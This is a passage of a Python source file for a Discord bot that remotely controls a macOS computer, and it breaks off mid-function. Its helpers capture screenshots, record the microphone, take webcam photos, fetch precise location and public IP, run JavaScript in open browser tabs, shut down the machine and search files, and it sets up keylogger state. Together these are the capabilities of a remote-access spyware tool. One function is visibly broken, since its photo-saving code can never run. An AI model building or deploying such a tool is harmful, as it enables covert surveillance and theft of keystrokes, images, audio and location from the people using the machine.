# importing packages
import os
import discord
from discord.ext import commands
try:
    from dotenv import load_dotenv
except ImportError:
    try:
        from python_dotenv import load_dotenv
    except ImportError:
        raise ImportError("Neither 'dotenv' nor 'python_dotenv' could be imported. Please ensure 'python-dotenv' is installed in your environment.")
import sounddevice as sd
import scipy.io.wavfile as wav
import numpy as np
from datetime import datetime
import asyncio
import psutil
import cv2
import platform
import socket
import time
import webbrowser
import subprocess
from pynput import keyboard
import threading
import json
import logging
from Quartz import (
    CGMainDisplayID,
    CGDisplayCreateImage,
    kCGNullWindowID,
    kCGWindowListOptionOnScreenOnly,
    CGWindowListCopyWindowInfo,
    kCGNullWindowID
)
import shutil
import traceback
import fnmatch
import re
from pathlib import Path

# Set up
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('discord')

# load .env token
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    logger.error('DISCORD_TOKEN not found in environment variables. Please set it in your .env file.')
    print('DISCORD_TOKEN not found in environment variables. Please set it in your .env file.')
    exit(1)

# Configuration for new commands
ALLOWED_USER_IDS = os.getenv('ALLOWED_USER_IDS', '')  # Comma-separated list of user IDs authorized for /kill
FIND_DEFAULT_PATH = os.getenv('FIND_DEFAULT_PATH', str(Path.home()))  # Default search path for /find command

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# variable for keylogger
keylogger_active = False
keylogger_data = []
keylogger_listener = None
keylogger_channel = None
last_send_time = 0

# def func
def take_screenshot():
    """Take a screenshot and save it to a file. Returns the file path."""
    from PIL import ImageGrab
    screenshot = ImageGrab.grab()
    screenshot_path = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
    screenshot.save(screenshot_path)
    return screenshot_path

def record_audio(duration=10, sample_rate=44100):
    """Record audio from the microphone and save to a file. Returns the file path."""
    recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
    sd.wait()
    audio_path = f'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.wav'
    wav.write(audio_path, sample_rate, recording)
    return audio_path

def get_system_info():
    """Get comprehensive system information as a string."""
    import requests
    from datetime import datetime
    
    system_info = "=== SYSTEM INFORMATION ===\n\n"
    
    # Date and Time
    current_time = datetime.now()
    system_info += f"📅 **Current Time**: {current_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    system_info += f"🌍 **Timezone**: {current_time.astimezone().tzname()}\n\n"
    
    # macOS Version and Model
    try:
        mac_version = platform.mac_ver()[0]
        system_info += f"🖥️ **macOS Version**: {mac_version}\n"
    except Exception:
        system_info += f"🖥️ **macOS Version**: Unknown\n"
    
    try:
        # Get Mac model using system_profiler
        model_result = subprocess.run(['system_profiler', 'SPHardwareDataType'], 
                                    capture_output=True, text=True, check=False)
        if model_result.returncode == 0:
            for line in model_result.stdout.split('\n'):
                if 'Model Name:' in line:
                    model = line.split('Model Name:')[1].strip()
                    system_info += f"💻 **Mac Model**: {model}\n"
                    break
                elif 'Model Identifier:' in line:
                    identifier = line.split('Model Identifier:')[1].strip()
                    system_info += f"🔧 **Model ID**: {identifier}\n"
        else:
            system_info += f"💻 **Mac Model**: Unknown\n"
    except Exception:
        system_info += f"💻 **Mac Model**: Unknown\n"
    
    # CPU Information
    try:
        cpu_count = psutil.cpu_count(logical=False)
        cpu_count_logical = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        cpu_percent = psutil.cpu_percent(interval=1)
        
        system_info += f"🔥 **CPU Cores**: {cpu_count} physical, {cpu_count_logical} logical\n"
        if cpu_freq:
            system_info += f"⚡ **CPU Frequency**: {cpu_freq.current:.1f} MHz (Max: {cpu_freq.max:.1f} MHz)\n"
        system_info += f"📊 **CPU Usage**: {cpu_percent}%\n"
        system_info += f"🖲️ **Processor**: {platform.processor()}\n\n"
    except Exception as e:
        system_info += f"🔥 **CPU Info**: Error getting CPU info\n\n"
    
    # Memory Information
    try:
        memory = psutil.virtual_memory()
        memory_gb_total = memory.total / (1024**3)
        memory_gb_used = memory.used / (1024**3)
        memory_gb_available = memory.available / (1024**3)
        
        system_info += f"🧠 **Total RAM**: {memory_gb_total:.2f} GB\n"
        system_info += f"📈 **Used RAM**: {memory_gb_used:.2f} GB ({memory.percent}%)\n"
        system_info += f"📉 **Available RAM**: {memory_gb_available:.2f} GB\n\n"
    except Exception:
        system_info += f"🧠 **RAM Info**: Error getting memory info\n\n"
    
    # Battery Information
    try:
        battery = psutil.sensors_battery()
        if battery:
            battery_percent = battery.percent
            plugged = "🔌 Plugged In" if battery.power_plugged else "🔋 On Battery"
            if battery.secsleft != psutil.POWER_TIME_UNLIMITED and battery.secsleft > 0:
                hours, remainder = divmod(battery.secsleft, 3600)
                minutes = remainder // 60
                time_left = f" ({hours}h {minutes}m remaining)"
            else:
                time_left = ""
            system_info += f"🔋 **Battery**: {battery_percent}% - {plugged}{time_left}\n\n"
        else:
            system_info += f"🔋 **Battery**: No battery detected (Desktop Mac)\n\n"
    except Exception:
        system_info += f"🔋 **Battery**: Error getting battery info\n\n"
    
    # Network and Location
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        system_info += f"🌐 **Hostname**: {hostname}\n"
        system_info += f"🔗 **Local IP**: {local_ip}\n"
        
        # Get public IP and location
        try:
            response = requests.get('https://ipapi.co/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                public_ip = data.get('ip', 'Unknown')
                city = data.get('city', 'Unknown')
                region = data.get('region', 'Unknown')
                country = data.get('country_name', 'Unknown')
                isp = data.get('org', 'Unknown')
                
                system_info += f"🌍 **Public IP**: {public_ip}\n"
                system_info += f"📍 **Location**: {city}, {region}, {country}\n"
                system_info += f"🏢 **ISP**: {isp}\n"
            else:
                system_info += f"🌍 **Public IP**: Unable to fetch\n"
                system_info += f"📍 **Location**: Unable to fetch\n"
        except Exception:
            system_info += f"🌍 **Public IP**: Unable to fetch (No internet)\n"
            system_info += f"📍 **Location**: Unable to fetch\n"
    except Exception:
        system_info += f"🌐 **Network Info**: Error getting network info\n"
    
    # Display Information
    try:
        from PIL import ImageGrab
        import Quartz
        
        # Get screen size using PIL
        screen = ImageGrab.grab()
        width, height = screen.size
        system_info += f"\n📺 **Screen Resolution**: {width} x {height} pixels\n"
        
        # Get additional display info using Quartz
        try:
            main_display = Quartz.CGMainDisplayID()
            display_bounds = Quartz.CGDisplayBounds(main_display)
            display_width = int(display_bounds.size.width)
            display_height = int(display_bounds.size.height)
            
            # Get display scaling factor
            backing_scale = Quartz.CGDisplayCreateImage(main_display)
            if backing_scale:
                system_info += f"🔍 **Display Scale**: Retina/HiDPI detected\n"
            
            # Calculate approximate physical size (this is an estimate)
            dpi = 72  # Default macOS DPI
            width_inches = display_width / dpi
            height_inches = display_height / dpi
            diagonal_inches = (width_inches**2 + height_inches**2)**0.5
            
            system_info += f"📐 **Estimated Size**: {diagonal_inches:.1f}\" diagonal\n"
            
        except Exception:
            system_info += f"📺 **Display Details**: Basic resolution only\n"
            
    except Exception:
        system_info += f"\n📺 **Screen Info**: Unable to detect screen size\n"

    # Additional System Info
    system_info += f"\n=== ADDITIONAL INFO ===\n"
    system_info += f"🐍 **Python Version**: {platform.python_version()}\n"
    system_info += f"📦 **Platform**: {platform.platform()}\n"
    system_info += f"🖥️ **Architecture**: {platform.architecture()[0]}\n"
    
    return system_info

def get_precise_location():
    """Get precise location using macOS Core Location Services via Shortcuts.
    
    Returns:
        dict: Location data with coordinates, address, and timestamp
    """
    from datetime import datetime
    import json
    
    location_data = {
        'success': False,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
        'timezone': datetime.now().astimezone().tzname(),
        'latitude': None,
        'longitude': None,
        'address': None,
        'error': None
    }
    
    try:
        # First, try to get location using the required shortcut
        result = subprocess.run([
            'shortcuts', 'run', 'Get Location Data'
        ], capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0 and result.stdout.strip():
            output = result.stdout.strip()
            
            try:
                # Try to parse as JSON if the shortcut returns structured data
                location_info = json.loads(output)
                location_data.update({
                    'success': True,
                    'latitude': location_info.get('latitude'),
                    'longitude': location_info.get('longitude'),
                    'address': location_info.get('address', 'Address not available')
                })
                return location_data
            except json.JSONDecodeError:
                # If not JSON, try to parse plain text in the form:
                # "address, latitude, longitude" OR "latitude, longitude"
                if ',' in output:
                    parts = [p.strip() for p in output.split(',')]
                    try:
                        if len(parts) >= 3:
                            # Use the last two fields as coordinates, everything before as address
                            latitude = float(parts[-2])
                            longitude = float(parts[-1])
                            address_str = ', '.join(parts[:-2]).strip()
                            location_data.update({
                                'success': True,
                                'latitude': latitude,
                                'longitude': longitude,
                                'address': address_str or 'Address not available'
                            })
                            return location_data
                        elif len(parts) >= 2:
                            latitude = float(parts[0])
                            longitude = float(parts[1])
                            # Fallback: derive address via reverse geocoding
                            address = get_address_from_coordinates(latitude, longitude)
                            location_data.update({
                                'success': True,
                                'latitude': latitude,
                                'longitude': longitude,
                                'address': address
                            })
                            return location_data
                        else:
                            location_data['error'] = "Unexpected shortcut output format"
                    except ValueError:
                        location_data['error'] = "Invalid coordinate format from shortcut"
                else:
                    location_data['error'] = "Unexpected shortcut output format"
        else:
            if "doesn't exist" in result.stderr.lower() or "not found" in result.stderr.lower():
                location_data['error'] = "Required shortcut 'Get Location Data' not found"
            elif "permission" in result.stderr.lower() or "denied" in result.stderr.lower():
                location_data['error'] = "Location permission denied - check Privacy settings"
            else:
                location_data['error'] = f"Shortcut execution failed: {result.stderr.strip() if result.stderr else 'No output received'}"
            
    except subprocess.TimeoutExpired:
        location_data['error'] = "Location request timed out - GPS may be unavailable"
    except FileNotFoundError:
        location_data['error'] = "Shortcuts app not found - macOS 12+ required"
    except Exception as e:
        location_data['error'] = f"Unexpected error: {str(e)}"
    
    return location_data

def get_address_from_coordinates(latitude, longitude):
    """Get human-readable address from coordinates using reverse geocoding."""
    try:
        import requests
        # Use a reliable reverse geocoding service
        response = requests.get(
            f"https://api.bigdatacloud.net/data/reverse-geocode-client?latitude={latitude}&longitude={longitude}&localityLanguage=en",
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            
            # Build address from components
            address_parts = []
            
            if data.get('locality'):  # City
                address_parts.append(data['locality'])
            if data.get('principalSubdivision'):  # State/Province
                address_parts.append(data['principalSubdivision'])
            if data.get('countryName'):  # Country
                address_parts.append(data['countryName'])
            
            if address_parts:
                return ', '.join(address_parts)
            else:
                return f"Coordinates: {latitude:.6f}, {longitude:.6f}"
        else:
            return f"Coordinates: {latitude:.6f}, {longitude:.6f}"
            
    except Exception:
        return f"Coordinates: {latitude:.6f}, {longitude:.6f}"

def get_ip_address():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

def get_uptime():
    uptime = time.time() - psutil.boot_time()
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    return f"{hours}h {minutes}m {seconds}s"

def get_top_processes(sort_by='ram', limit=15):
    """Get top processes sorted by CPU or RAM usage, combining processes with same name.
    
    Args:
        sort_by: 'cpu' or 'ram' to sort by CPU or RAM usage
        limit: Number of process groups to return
    
    Returns:
        List of process dictionaries with combined stats
    """
    # List of common processes to exclude
    system_processes = {
        'WindowServer', 'kernel_task', 'launchd', 'logd', 'UserEventAgent', 'fseventsd',
        'mediaremoted', 'systemstats', 'configd', 'powerd', 'IOMFB_bics_daemo', 'syslogd',
        'notifyd', 'distnoted', 'securityd', 'hidd', 'coreaudiod', 'diskarbitrationd',
        'bluetoothd', 'airportd', 'cfprefsd', 'mds', 'mdworker', 'mds_stores', 'opendirectoryd',
        'iconservicesagent', 'iconservicesd', 'usbd', 'launchservicesd', 'warmd', 'sandboxd',
        'tccd', 'trustd', 'appleeventsd', 'corebrightnessd', 'locationd', 'sharingd', 'lsd',
        'Dock', 'Finder', 'SystemUIServer', 'loginwindow', 'remoted', 'sharingd', 'spindump',
        'ReportCrash', 'backupd', 'com.apple.WebKit.WebContent', 'com.apple.WebKit.Networking',
        'com.apple.WebKit.GPU', 'com.apple.Safari', 'com.apple.Safari.SafeBrowsing.Service',
        'com.apple.SafariBookmarksSyncAgent', 'com.apple.SafariCloudHistoryPushAgent',
        'com.apple.SafariHistory', 'com.apple.SafariLaunchAgent', 'com.apple.SafariPlugInUpdateNotifier',
        'com.apple.SafariServices', 'com.apple.SafariShared', 'com.apple.SafariWebContent',
        'com.apple.SafariWebContent.Development', 'com.apple.SafariWebContent.Network',
        'com.apple.SafariWebContent.Preheated', 'com.apple.SafariWebContent.Service',
        'com.apple.SafariWebContent.WebProcess', 'com.apple.SafariWebKit',
    }
    
    # Dictionary to combine processes by name
    process_groups = {}
    
    for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
        try:
            info = proc.info
            name = info.get('name', '')
            if name in system_processes:
                continue
                
            pid = info['pid']
            mem = info.get('memory_info')
            rss = mem.rss if mem else 0
            
            # Get CPU percentage (may be 0.0 on first call)
            try:
                cpu_percent = proc.cpu_percent()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                cpu_percent = 0.0
            
            # Combine processes with same name
            if name in process_groups:
                process_groups[name]['pids'].append(pid)
                process_groups[name]['rss'] += rss
                process_groups[name]['cpu_percent'] += cpu_percent
                process_groups[name]['count'] += 1
            else:
                process_groups[name] = {
                    'name': name,
                    'pids': [pid],
                    'rss': rss,
                    'cpu_percent': cpu_percent,
                    'count': 1
                }
                
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    
    # Convert to list and sort
    processes = list(process_groups.values())
    sort_key = 'cpu_percent' if sort_by == 'cpu' else 'rss'
    processes.sort(key=lambda x: x[sort_key], reverse=True)
    
    return processes[:limit]

def take_webcam_photo(warmup_seconds: float = 0.3):
    """Open the webcam, wait briefly to allow exposure/focus to settle, then capture a photo."""
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None
    # Allow the camera to warm up
    time.sleep(warmup_seconds)
    # Capture frame after warmup
    ret, frame = cap.read()
    cap.release()
    if not ret or frame is None:
        return None
        photo_path = f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'
        cv2.imwrite(photo_path, frame)
        return photo_path

import Quartz

NSEvent = Quartz.NSEvent
NSSystemDefined = 14
NX_KEYTYPE_PLAY = 16
NX_KEYTYPE_NEXT = 17
NX_KEYTYPE_PREVIOUS = 18

def HIDPostAuxKey(key):
    def doKey(down):
        ev = NSEvent.otherEventWithType_location_modifierFlags_timestamp_windowNumber_context_subtype_data1_data2_(
            NSSystemDefined,
            (0, 0),
            0xa00 if down else 0xb00,
            0, 0, 0,
            8,
            (key << 16) | ((0xa if down else 0xb) << 8),
            -1
        )
        cev = ev.CGEvent()
        Quartz.CGEventPost(0, cev)
    doKey(True)
    doKey(False)

def control_media(action: str):
    """Control media playback using Quartz media keys.
    
    Returns (success: bool, message: str)
    """
    action = action.lower()

    if action == 'play':
        HIDPostAuxKey(NX_KEYTYPE_PLAY)
        return True, "Play/Pause command sent"
    elif action == 'next':
        HIDPostAuxKey(NX_KEYTYPE_NEXT)
        return True, "Next track command sent"
    elif action == 'prev':
        HIDPostAuxKey(NX_KEYTYPE_PREVIOUS)
        return True, "Previous track command sent"
    else:
        return False, f"Unsupported action: {action}"

def set_volume(level):
    """Set system volume (macOS) to a value between 0 and 100."""
    try:
        level = int(level)
        if not (0 <= level <= 100):
            raise ValueError("Volume must be between 0 and 100.")
        # smt abt osascript dk
        subprocess.run(['osascript', '-e', f'set volume output volume {level}'])
        return True, level
    except Exception as e:
        return False, str(e)

def control_system_power(action: str):
    """Control system power state (shutdown, restart, sleep).
    
    Args:
        action: 'shutdown', 'restart', or 'sleep'
    
    Returns:
        tuple: (success: bool, message: str)
    """
    action = action.lower()
    
    try:
        if action == 'shutdown':
            # Use sudo shutdown command for immediate shutdown
            result = subprocess.run(['sudo', 'shutdown', '-h', 'now'], 
                                  capture_output=True, text=True, check=False)
            if result.returncode == 0:
                return True, "System shutdown initiated"
            else:
                return False, f"Shutdown failed: {result.stderr.strip() if result.stderr else 'Unknown error'}"
                
        elif action == 'restart':
            # Use sudo shutdown command for restart
            result = subprocess.run(['sudo', 'shutdown', '-r', 'now'], 
                                  capture_output=True, text=True, check=False)
            if result.returncode == 0:
                return True, "System restart initiated"
            else:
                return False, f"Restart failed: {result.stderr.strip() if result.stderr else 'Unknown error'}"
                
        elif action == 'sleep':
            # Use pmset to put system to sleep (no sudo required for sleep)
            result = subprocess.run(['pmset', 'sleepnow'], 
                                  capture_output=True, text=True, check=False)
            if result.returncode == 0:
                return True, "System going to sleep"
            else:
                # Fallback: try osascript method
                try:
                    subprocess.run(['osascript', '-e', 'tell application "System Events" to sleep'], 
                                 check=True, timeout=5)
                    return True, "System going to sleep"
                except subprocess.CalledProcessError:
                    return False, f"Sleep failed: {result.stderr.strip() if result.stderr else 'Unknown error'}"
                except subprocess.TimeoutExpired:
                    return True, "System going to sleep (command timed out, likely successful)"
                    
        else:
            return False, f"Unsupported power action: {action}. Use 'shutdown', 'restart', or 'sleep'"
            
    except FileNotFoundError as e:
        return False, f"Required system command not found: {str(e)}"
    except Exception as e:
        return False, f"Error controlling power: {str(e)}"

def is_process_running(candidate_names):
    """Return True if any process name contains any of the candidate name substrings (case-insensitive)."""
    try:
        candidate_lower = [c.lower() for c in candidate_names]
        for proc in psutil.process_iter(['name']):
            name = (proc.info.get('name') or '').lower()
            if any(c in name for c in candidate_lower):
                return True
    except Exception:
        pass
    return False

def format_time_mm_ss(seconds_value: float) -> str:
    """Format seconds as MM:SS for display."""
    try:
        total_seconds = max(0, int(round(float(seconds_value))))
        minutes = total_seconds // 60
        seconds = total_seconds % 60
        return f"{minutes:02d}:{seconds:02d}"
    except Exception:
        return "00:00"

def get_spotify_playing_info():
    """Return a dict of now-playing info for Spotify, or None if unavailable."""
    if not is_process_running(['Spotify']):
        return None
    try:
        script = (
            'tell application "Spotify" to set out to '
            '(name of current track as text) & "\t" & '
            '(artist of current track as text) & "\t" & '
            '(album of current track as text) & "\t" & '
            '(duration of current track as text) & "\t" & '
            '(player position as text) & "\t" & '
            '(try artwork url of current track as text on error "" end try) & "\t" & '
            '(player state as text)\nreturn out'
        )
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        if result.returncode != 0:
            return None
        raw = result.stdout.strip()
        if not raw:
            return None
        parts = raw.split('\t')
        if len(parts) < 7:
            return None
        title, artist, album, duration_str, position_str, artwork_url, state = parts[:7]
        try:
            duration = float(duration_str)
            if duration > 10000:
                duration = duration / 1000.0
        except Exception:
            duration = 0.0
        try:
            position = float(position_str)
        except Exception:
            position = 0.0
        return {
            'app': 'Spotify',
            'title': title,
            'artist': artist,
            'album': album,
            'duration': duration,
            'position': position,
            'state': state,
            'artwork_url': artwork_url if artwork_url else None,
            'artwork_path': None,
        }
    except Exception:
        return None

def get_music_playing_info():
    """Return a dict of now-playing info for Music/iTunes, or None if unavailable."""
    target = 'Music' if is_process_running(['Music']) else ('iTunes' if is_process_running(['iTunes']) else None)
    if not target:
        return None
    try:
        info_script = (
            f'return (tell application "{target}" to '
            f'(name of current track as text) & "\t" & '
            f'(artist of current track as text) & "\t" & '
            f'(album of current track as text) & "\t" & '
            f'(duration of current track as text) & "\t" & '
            f'(player position as text) & "\t" & '
            f'(player state as text))'
        )
        result = subprocess.run(['osascript', '-e', info_script], capture_output=True, text=True, check=False)
        if result.returncode != 0:
            return None
        raw = result.stdout.strip()
        if not raw:
            return None
        parts = raw.split('\t')
        if len(parts) < 6:
            return None
        title, artist, album, duration_str, position_str, state = parts[:6]
        try:
            duration = float(duration_str)
        except Exception:
            duration = 0.0
        try:
            position = float(position_str)
        except Exception:
            position = 0.0

        artwork_path = '/tmp/music_artwork.jpg'
        art_script = (
            'set outPath to POSIX file "' + artwork_path + '"\n'
            'tell application "' + target + '"\n'
            '    try\n'
            '        if (count of artworks of current track) > 0 then\n'
            '            set fileRef to open for access outPath with write permission\n'
            '            set eof of fileRef to 0\n'
            '            write (data of artwork 1 of current track) to fileRef\n'
            '            close access fileRef\n'
            '            return POSIX path of outPath\n'
            '        else\n'
            '            return ""\n'
            '        end if\n'
            '    on error\n'
            '        try\n'
            '            close access outPath\n'
            '        end try\n'
            '        return ""\n'
            '    end try\n'
            'end tell'
        )
        art_res = subprocess.run(['osascript', '-e', art_script], capture_output=True, text=True, check=False)
        art_out = art_res.stdout.strip() if art_res.returncode == 0 else ''
        if not art_out or not os.path.exists(artwork_path):
            artwork_path = None

        return {
            'app': target,
            'title': title,
            'artist': artist,
            'album': album,
            'duration': duration,
            'position': position,
            'state': state,
            'artwork_url': None,
            'artwork_path': artwork_path,
        }
    except Exception:
        return None

def get_media_playing_info():
    """Return now-playing info for Spotify or Music, preferring Spotify if both available."""
    info = get_spotify_playing_info()
    if info:
        return info
    info = get_music_playing_info()
    if info:
        return info
    # Fallback: try YouTube in common browsers
    info = get_youtube_playing_info()
    if info:
        return info
    return None

def _run_js_in_chromium_app(app_name: str, js: str) -> str:
    """Execute JavaScript in the active tab of the front window of a Chromium-based browser."""
    try:
        script = (f'tell application "{app_name}"\n'
                  f'  if (count of windows) = 0 then return ""\n'
                  f'  set theTab to active tab of front window\n'
                  f'  execute javascript "{js}" in theTab\n'
                  f'end tell')
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def _run_js_in_safari(js: str) -> str:
    """Execute JavaScript in the current tab of the front document in Safari."""
    try:
        script = ('tell application "Safari"\n'
                  '  if (count of documents) = 0 then return ""\n'
                  f'  do JavaScript "{js}" in current tab of front document\n'
                  'end tell')
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def _run_js_in_chromium_app_any_youtube_tab(app_name: str, js: str) -> str:
    """Execute JavaScript in the first YouTube tab across all windows of a Chromium-based browser."""
    try:
        script = (
            f'tell application "{app_name}"\n'
            '  set theResult to ""\n'
            '  if (count of windows) = 0 then return theResult\n'
            '  repeat with w in windows\n'
            '    repeat with t in tabs of w\n'
            '      set theUrl to (URL of t as text)\n'
            '      if theUrl contains "youtube.com" or theUrl contains "music.youtube.com" then\n'
            f'        set theResult to execute javascript "{js}" in t\n'
            '        return theResult\n'
            '      end if\n'
            '    end repeat\n'
            '  end repeat\n'
            '  return theResult\n'
            'end tell'
        )
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def _run_js_in_safari_any_youtube_tab(js: str) -> str:
    """Execute JavaScript in the first YouTube tab across all documents in Safari."""
    try:
        script = (
            'tell application "Safari"\n'
            '  set theResult to ""\n'
            '  if (count of documents) = 0 then return theResult\n'
            '  repeat with d in documents\n'
            '    set theUrl to (URL of d as text)\n'
            '    if theUrl contains "youtube.com" or theUrl contains "music.youtube.com" then\n'
            f'      set theResult to do JavaScript "{js}" in d\n'
            '      return theResult\n'
            '    end if\n'
            '  end repeat\n'
            '  return theResult\n'
            'end tell'
        )
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def get_youtube_playing_info():
    """Return now-playing info when YouTube is playing in Chrome/Brave/Edge/Vivaldi/Opera or Safari, else None."""
    # JavaScript to collect: position, duration, title, channel, url, artwork, state
    js = (
        "var v=document.querySelector('video');"
        "var url=location.href;"
        "var title=document.title||'';"
        "var chEl=document.querySelector('#owner-name a, ytd-channel-name a, ytd-video-owner-renderer a');"
        "var channel=chEl?chEl.textContent.trim():'';"
        "var id='';try{id=(new URL(url)).searchParams.get('v')||'';}catch(e){id='';}"
        "var art=id?('https://i.ytimg.com/vi/'+id+'/hqdefault.jpg'):'';"
        "var state=(v&& !v.paused)?'playing':(v?'paused':'stopped');"
        "(v?v.currentTime:0)+'\\t'+(v?v.duration:0)+'\\t'+title+'\\t'+channel+'\\t'+url+'\\t'+art+'\\t'+state;"
    )

    chromium_apps = [
        'Google Chrome',
        'Brave Browser',
        'Microsoft Edge',
        'Vivaldi',
        'Opera',
    ]

    # Try Chromium-based browsers first
    for app in chromium_apps:
        if is_process_running([app]):
            out = _run_js_in_chromium_app(app, js)
            if out:
                parts = out.split('\t')
                if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                    try:
                        position = float(parts[0])
                    except Exception:
                        position = 0.0
                    try:
                        duration = float(parts[1])
                    except Exception:
                        duration = 0.0
                    title = parts[2]
                    channel = parts[3]
                    artwork_url = parts[5] if parts[5] else None
                    state = parts[6] if parts[6] else 'unknown'
                    return {
                        'app': f'YouTube ({app})',
                        'title': title,
                        'artist': channel or 'Unknown',
                        'album': 'YouTube',
                        'duration': duration,
                        'position': position,
                        'state': state,
                        'artwork_url': artwork_url,
                        'artwork_path': None,
                    }

    # Try any YouTube tab in Chromium browsers
    for app in chromium_apps:
        if is_process_running([app]):
            out = _run_js_in_chromium_app_any_youtube_tab(app, js)
            if out:
                parts = out.split('\t')
                if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                    try:
                        position = float(parts[0])
                    except Exception:
                        position = 0.0
                    try:
                        duration = float(parts[1])
                    except Exception:
                        duration = 0.0
                    title = parts[2]
                    channel = parts[3]
                    artwork_url = parts[5] if parts[5] else None
                    state = parts[6] if parts[6] else 'unknown'
                    return {
                        'app': f'YouTube ({app})',
                        'title': title,
                        'artist': channel or 'Unknown',
                        'album': 'YouTube',
                        'duration': duration,
                        'position': position,
                        'state': state,
                        'artwork_url': artwork_url,
                        'artwork_path': None,
                    }

    # Try Safari
    if is_process_running(['Safari']):
        out = _run_js_in_safari(js)
        if out:
            parts = out.split('\t')
            if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                try:
                    position = float(parts[0])
                except Exception:
                    position = 0.0
                try:
                    duration = float(parts[1])
                except Exception:
                    duration = 0.0
                title = parts[2]
                channel = parts[3]
                artwork_url = parts[5] if parts[5] else None
                state = parts[6] if parts[6] else 'unknown'
                return {
                    'app': 'YouTube (Safari)',
                    'title': title,
                    'artist': channel or 'Unknown',
                    'album': 'YouTube',
                    'duration': duration,
                    'position': position,
                    'state': state,
                    'artwork_url': artwork_url,
                    'artwork_path': None,
                }

    # Any YouTube tab in Safari
    if is_process_running(['Safari']):
        out = _run_js_in_safari_any_youtube_tab(js)
        if out:
            parts = out.split('\t')
            if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                try:
                    position = float(parts[0])
                except Exception:
                    position = 0.0
                try:
                    duration = float(parts[1])
                except Exception:
                    duration = 0.0
                title = parts[2]
                channel = parts[3]
                artwork_url = parts[5] if parts[5] else None
                state = parts[6] if parts[6] else 'unknown'
                return {
                    'app': 'YouTube (Safari)',
                    'title': title,
                    'artist': channel or 'Unknown',
                    'album': 'YouTube',
                    'duration': duration,
                    'position': position,
                    'state': state,
                    'artwork_url': artwork_url,
                    'artwork_path': None,
                }
    return None

def _chromium_media_control(app_name: str, action: str) -> bool:
    # Uses Media Session JS API or key simulation inside the tab if possible
    js_map = {
        'play': "(()=>{var v=document.querySelector('video');if(!v)return false; if(v.paused){v.play();}else{v.pause();} return true;})()",
        'next': "(()=>{var btn=document.querySelector('.ytp-next-button, ytd-player .ytp-next-button'); if(btn){btn.click(); return true;} return false;})()",
        'prev': "(()=>{var btn=document.querySelector('.ytp-prev-button, ytd-player .ytp-prev-button'); if(btn){btn.click(); return true;} return false;})()",
    }
    js = js_map.get(action)
    if not js:
        return False
    out = _run_js_in_chromium_app(app_name, js)
    return out.strip().lower() == 'true'

def _safari_media_control(action: str) -> bool:
    js_map = {
        'play': "(()=>{var v=document.querySelector('video');if(!v)return false; if(v.paused){v.play();}else{v.pause();} return true;})()",
        'next': "(()=>{var btn=document.querySelector('.ytp-next-button, ytd-player .ytp-next-button'); if(btn){btn.click(); return true;} return false;})()",
        'prev': "(()=>{var btn=document.querySelector('.ytp-prev-button, ytd-player .ytp-prev-button'); if(btn){btn.click(); return true;} return false;})()",
    }
    js = js_map.get(action)
    if not js:
        return False
    out = _run_js_in_safari(js)
    return out.strip().lower() == 'true'

def _activate_app(app_name: str) -> bool:
    try:
        result = subprocess.run(['osascript', '-e', f'tell application "{app_name}" to activate'], capture_output=True, text=True, check=False)
        return result.returncode == 0
    except Exception:
        return False

# Utility functions for new commands
async def search_files_async(query: str, path: str, mode: str = 'name_glob', content: str = None, 
                           limit: int = 100, depth: int = 6, include_hidden: bool = False, 
                           timeout: float = 30.0):
    """Search for files asynchronously with various filters."""
    import time
    from datetime import datetime
    
    def _search_files():
        results = []
        start_time = time.time()
        search_path = Path(path).expanduser().resolve()
        
        if not search_path.exists():
            return {'error': f"Path does not exist: {path}"}
        
        try:
            for root, dirs, files in os.walk(str(search_path)):
                # Check timeout
                if time.time() - start_time > timeout:
                    return {'results': results, 'partial': True, 'message': 'Search timed out after 30s'}
                
                # Calculate current depth
                current_depth = len(Path(root).relative_to(search_path).parts)
                if current_depth >= depth:
                    dirs.clear()  # Don't recurse deeper
                    continue
                
                # Filter hidden directories if not included
                if not include_hidden:
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                
                for filename in files:
                    # Skip hidden files if not included
                    if not include_hidden and filename.startswith('.'):
                        continue
                    
                    # Check file name match
                    name_match = False
                    if mode == 'name_glob':
                        try:
                            name_match = fnmatch.fnmatch(filename, query)
                        except Exception:
                            continue
                    elif mode == 'name_regex':
                        try:
